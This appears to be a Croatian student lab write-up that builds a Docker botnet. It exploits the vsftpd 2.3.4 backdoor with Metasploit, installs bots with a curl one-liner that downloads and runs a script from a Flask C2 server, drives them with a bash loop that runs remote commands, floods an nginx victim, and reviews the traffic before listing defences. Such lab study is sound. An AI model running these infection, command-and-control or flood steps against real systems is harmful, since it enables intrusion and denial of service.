# 1. Praktična implementacija

## 1.1 Arhitektura laboratorijskog okruženja

Za potrebe demonstracije svi kontejneri povezani su na istu Docker mrežu `botnet_lab` (172.18.0.0/24).

Taj pristup je mnogo jednostavniji od pokretanja velikog broja pravih virtualnih uređaja na istom računalu, pogotovo što se tiče međusobne komunikacije
različitih komponenata, a još uvijek nam pruža potpunu separaciju između "računala".

| Kontejner | IP adresa     | Uloga                          |
|-----------|---------------|--------------------------------|
| c2        | 172.18.0.2    | Command and Control poslužitelj |
| bot1-bot5 | 172.18.0.3-7  | Ranjivi Metasploitable2 botovi |
| victim    | 172.18.0.10   | Žrtva DDoS napada (nginx)      |
| attacker  | 172.18.0.100  | Napadač s Metasploit Frameworkom |

Pokretanjem skripte `/scripts/setup.sh` izgradimo i inicijaliziramo sve Docker kontejnere te im dodijelimo IP adrese u virtualnoj mreži.

<img width="1000" height="245" alt="image" src="https://github.com/user-attachments/assets/af25344a-9424-42d8-97d9-6a1e8e7c1b75" />

### 1.1.2 Komponente sustava

* **C2 poslužitelj** – Flask aplikacija koja prima i distribuira naredbe botovima putem HTTP-a
* **Botovi** – Metasploitable2 kontejneri s poznatim ranjivostima
* **Napadač** – kontejner s Metasploit frameworkom za eksploataciju
* **Žrtva** – nginx web poslužitelj kao cilj DDoS napada

## 1.2 Eksploatacija ranjivosti i dobivanje TCP ljuske

### 1.2.1 Skeniranje ranjivosti pomoću Nmap

Prije eksploatacije, skeniramo ciljni sustav kako bismo identificirali otvorene portove i servise:

```bash
nmap -A 172.18.0.3
```

<img width="714" height="598" alt="image" src="https://github.com/user-attachments/assets/469eee5d-a9f3-490d-8cb5-503dbd1e91da" />


### 1.2.2 Iskorištavanje vsftpd 2.3.4 backdoor ranjivosti

Metasploitable2 je paket koji namjerno sadrži veliki broj poznatih ranjivosti. Jedna od njih je ranjivost u vsftpd 2.3.4 FTP poslužitelju (CVE-2011-2523). Backdoor se aktivira kada korisnik pošalje korisničko ime koje završava s `:)`, nakon čega se otvara shell na portu 6200.

Koraci eksploatacije u Metasploitu:
```
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 172.18.0.3
exploit
```

<img width="1024" height="696" alt="image" src="https://github.com/user-attachments/assets/37649bfb-17e8-4deb-aa4b-655cb1fb7dc4" />


Nakon uspješne eksploatacije dobivamo shell pristup botu, što nam omogućuje da postavimo bilo koji payload.

## 1.3 Implementacija C2 poslužitelja

### 1.3.1 Komunikacijski protokol

C2 poslužitelj implementiran je kao Flask web aplikacija s jednostavnim HTTP API-jem:

* `GET /cmd` – bot dohvaća trenutnu naredbu
* `POST /set` – napadač postavlja novu naredbu
* `GET /payload` – bot preuzima skriptu za trajnu infekciju

### 1.3.2 Distribucija naredbi botovima

Kada dobijemo shell pristup, u tom shellu se udaljeno pokreće skripta za zarazu:

```bash
curl -s http://172.18.0.2:9000/payload -o /tmp/bot.sh && chmod +x /tmp/bot.sh && nohup /tmp/bot.sh >/tmp/bot.log 2>&1 &
```

<img width="799" height="316" alt="image" src="https://github.com/user-attachments/assets/40d2400d-8e22-4b4a-917e-4927ba6d3a9b" />

Time se na svaki bot preuzima i u pozadini pokreće payload skripta s C2 poslužitelja. Dodana je i datoteka `bot.log` za jasniji uvid u rezultate naredbi
koje taj bot pokreće.

Ta payload naredba je pak bash skripta koja u beskonačnoj petlji:
1. Svakih 5 sekundi kontaktira C2 poslužitelj
2. Dohvaća trenutnu naredbu
3. Izvršava naredbu ako nije "idle"

```bash
while true; do
    CMD=$(curl -s http://172.18.0.2:9000/cmd)
    if [ "$CMD" != "idle" ]; then
        bash -c "$CMD"
    fi
    sleep 5
done
```

Pokretanjem npr. `docker exec attacker curl http://172.18.0.2:9000/set/whoami` postavljamo novu naredbu. Možemo ući u nekog od botova i uvjeriti se da se te naredbe izvršavaju:

<img width="1066" height="287" alt="image" src="https://github.com/user-attachments/assets/71776f87-c657-4f4d-bf97-32f1587359dd" />

## 1.4 Simulacija DDoS napada

### 1.4.1 Pokretanje napada putem botneta

Nakon što su svi botovi zaraženi, napadač može poslati naredbu za DDoS napad:

```bash
curl -X POST -H 'Content-Type: text/plain' \
  --data-binary 'while true; do curl -s http://172.18.0.10:80 >/dev/null; done &' \
  http://172.18.0.2:9000/set
```

Svi botovi, nakon što svakih pet sekundi od C2 servera dohvate najnoviju naredbu, počinju slati HTTP zahtjeve na žrtvu.

### 1.4.2 Analiza mrežnog prometa pomoću Wiresharka

Mrežni promet snimljen je pomoću tcpdumpa i analiziran u alatu Wireshark:

```bash
docker exec victim tcpdump -i eth0 -w /tmp/capture.pcap
```

Za vrijeme DDoS napada, mrežni promet na poslužitelju 'victim' izgleda ovako:

<img width="1919" height="981" alt="Snimka zaslona 2026-01-20 172002" src="https://github.com/user-attachments/assets/4e6868e4-91ac-4121-9697-428fefb835f6" />

Na slici se vidi veliki broj TCP konekcija sa svih 5 različitih IP adresa botova. Botovi u beskonačnoj petlji šalju zahtjeve, a snimanje mrežnog prometa čak i par sekundi rezultira .pcap datotekom veličine preko 500 MB.

Ako pak analiziramo promet na komponenti C2, vidimo da ga je puno manje. Samo se svaki bot javi svakih pet sekundi s novim HTTP GET /cmd zahtjevom. GET /payload zahtjevi vidljivi su samo na samom početku simulacije, kada Metasploit eksploitira shellove kojima je dobio pristup.

<img width="1912" height="1010" alt="capture_c2_beacon" src="https://github.com/user-attachments/assets/08670cd6-99bb-451b-adb6-49903e3f1bd4" />

Inspekcija mrežnog prometa na nekom od botova usred DDoS napada rezultira vrlo sličnim snimljenim paketima kao na komponenti 'victim', osim što su IP adrese konzistentne — bot otvara konekcije samo prema meti napada. Također, prometa ima pet puta manje. 

# 2. Otkrivanje i obrana od TCP ljuski i botneta

Mogući načini obrane:
* **Ažuriranje softvera** – zakrpa poznatih ranjivosti poput vsftpd 2.3.4
* **Vatrozid** – blokiranje neovlaštenog izlaznog prometa
* **IDS/IPS sustavi** – detekcija sumnjivog mrežnog prometa
* **Rate limiting** – ograničavanje broja zahtjeva po IP adresi
* **Mrežna segmentacija** – izolacija kritičnih sustava
